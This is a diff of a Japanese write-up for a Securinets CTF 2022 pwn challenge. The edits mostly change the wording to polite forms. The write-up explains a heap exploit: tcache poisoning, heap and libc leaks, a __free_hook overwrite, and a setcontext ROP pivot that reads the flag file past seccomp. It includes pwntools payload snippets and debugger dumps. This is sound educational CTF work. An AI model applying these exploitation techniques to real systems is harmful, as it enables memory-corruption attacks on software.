@@ -155,13 +155,11 @@ pwndbg> x/80gx 0x555555558000
 
 ## Solution:
 
-* `dwrite()`を使用して、`tcachebins`のリンクを置き換えることで、比較的容易にlibcアドレスの取得と`__free_hook`の書き換えができる。
-* `dallocate()`でnull終端してないのでヒープアドレスのリークも簡単にできる。
-* `seccomp`でシステムコールが制限されているので、`setcontext`関数などを試みたが、使えるROPガジェットがなかなか見つからなかった。
-* `mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];`と`setcontext`関数のROPガジェットを用いることでヒープメモリをスタックにしてROPにすることができた。
+* `dwrite()`を使用して、`tcachebins`のリンクを置き換えることで、比較的容易にlibcアドレスの取得と`__free_hook`の書き換えができます。
+* `dallocate()`でnull終端してないのでヒープアドレスのリークも簡単にできます。
+* `mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];`と`setcontext`関数のROPガジェットを用いることでヒープメモリをスタックにしてROPにすることができます。
 
-
-ヒープアドレスのリークは`tcachebins`にリンクされているchunkのアドレスをリークできるので、0x10サイズのchunkを`dallocate()`して、"\n"のみデータとして書き込み、その後に`dview()`するとヒープアドレスの上位7バイトをリークできる。
+ヒープアドレスのリークは`tcachebins`にリンクされているchunkのアドレスをリークできるので、0x10サイズのchunkを`dallocate()`して、"\n"のみデータとして書き込み、その後に`dview()`するとヒープアドレスの上位7バイトをリークできます。
 ```bash
 $ ./memory
 Memory can be easily accessed !
@@ -198,14 +196,14 @@ tcachebins
 0xf0 [  2]: 0x55555555b0a0 —▸ 0x55555555a390 ◂— 0x0
 ```
 
-`dwrite()`を用いて0xf0の`tcachebin`のフリーchunkを`0x55555555a390`から`0x55555555aef0`に変更する。
+`dwrite()`を用いて0xf0の`tcachebin`のフリーchunkを`0x55555555a390`から`0x55555555aef0`に変更します。
 ```
 変更前の状態：0xf0 [  2]: 0x55555555b0a0 —▸ 0x55555555a390 ◂— 0x0
 　　　　　　　　　　　　　　　
 変更後の状態：0xf0 [  2]: 0x55555555b0a0 —▸ 0x55555555aef0 ◂— 0x0
 ```
 
-変更後のヒープメモリの状態
+変更後のヒープメモリの状態は下記になります。
 ```
 0x55555555b070:	0x000055555555b1b0	0x000055555555ae90
 0x55555555b080:	0x0000000000000000	0x0000000000000000
@@ -247,7 +245,7 @@ tcachebins
 0x55555555aff0:	0x000055555555b20a	0x0000000000000000
 ```
 
-下記を実行することで、libcのアドレス(`0x00007ffff7f8bc40`)を取得できる
+下記を実行することで、libcのアドレス(`0x00007ffff7f8bc40`)を取得できます。
 ```python
 Alloc(0xe0, "\n")
 Alloc(0xe0, "A"*15+"\n")
@@ -269,12 +267,12 @@ View()
 0x55555555af80:	0x0000000000000003	0x0000000000000000
 ```
 
-下記を実行することで、0x80サイズの`tcachebins`に(`free_hook-0x10`)のデータを書き込むことができる。
+下記を実行することで、0x80サイズの`tcachebins`に(`free_hook-0x10`)のデータを書き込むことができます。
 ```python
 Free()
 Alloc(0xe0, b"A"*0x78+p64(0x81)+p64(free_hook-0x10))
 ```
-`tcachebins`に`__free_hook`のアドレスを書き込んだ状態
+`tcachebins`に`__free_hook`のアドレスを書き込んだ状態は下記になります。
 ```
 pwndbg> bins
 tcachebins
@@ -284,22 +282,22 @@ tcachebins
 0xd0 [  5]: 0x55555555a190 —▸ 0x555555559e60 —▸ 0x555555559b30 —▸ 0x555555559800 —▸ 0x555555559370 ◂— 0x0
 ```
 
-`__free_hook`には`seccomp`でシステムコールが制限されているためsystem関数が使えない。そのためROPに持ち込む必要があるが、`setcontext`関数で使用するレジスタが`rdx`に変更になっているため、直接は使用できない。
+`__free_hook`には`seccomp`でシステムコールが制限されているためsystem関数が使えない。そのためROPにする必要があるが、`setcontext`関数で使用するレジスタが`rdx`に変更になっているため、直接は使用できません。
 
-他には`push rdi; ... ;pop rsp;...;ret;`のROPガジェットを探したが、利用できるものはなかった。
+他には`push rdi; ... ;pop rsp;...;ret;`のROPガジェットを探したが、利用できるものはありませんでした。
 
-下記のサイトを確認したところ、`mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];`と`setcontext`関数のROPガジェットを利用することで、`rsp`レジスタにヒープのアドレスを設定できるので、ROPを利用できる。
+下記のサイトを確認したところ、`mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];`と`setcontext`関数のROPガジェットを利用することで、`rsp`レジスタにヒープのアドレスを設定できるので、ROPを利用できました。
 https://lkmidas.github.io/posts/20210103-heap-seccomp-rop/
 
-ROPでは、`./flag.txt`ファイルを`sys_open`して、`sys_read`、`sys_write`の順にシステムコールすることで、フラグファイルを読み出すことができる。
+ROPでは、`./flag.txt`ファイルを`sys_open`して、`sys_read`、`sys_write`の順にシステムコールすることで、フラグファイルを読み出すことができます。
 
-下記は、`__free_hook`に`mov rdx, qword ptr [rdi + 8];...`のアドレスを設定した状態
+下記は、`__free_hook`に`mov rdx, qword ptr [rdi + 8];...`のアドレスを設定した状態です。
 ```
 0x7ffff7f8de30 <fork_handlers+1552>:	0x0000000000000000	0x0000000000000000
 0x7ffff7f8de40 <__after_morecore_hook>:	0x000055555555b2c0	0x00007ffff7ef08b0
 ```
 
-下記はヒープにROPのコードを書き込んだ状態
+下記はヒープにROPのコードを書き込んだ状態です。
 ```
 0x55555555b290:	0x0000000000000000	0x0000000000000021
 0x55555555b2a0:	0x000055555555a770	0x0000555555559010
@@ -330,6 +328,7 @@ ROPでは、`./flag.txt`ファイルを`sys_open`して、`sys_read`、`sys_writ
 0x55555555b430:	0x0000000000000000	0x0000000000000000
 ```
 
+## Exploit code:
 Exploitコードは下記になります。
 ```python
 from pwn import *
@@ -456,6 +455,7 @@ Free()
 s.interactive()
 ```
 
+## Results:
 実行結果は下記になります。
 ```bash
 mito@ubuntu:~/CTF/Securinets_CTF_Quals_2022/Pwn_Memory$ python3 solve.py r
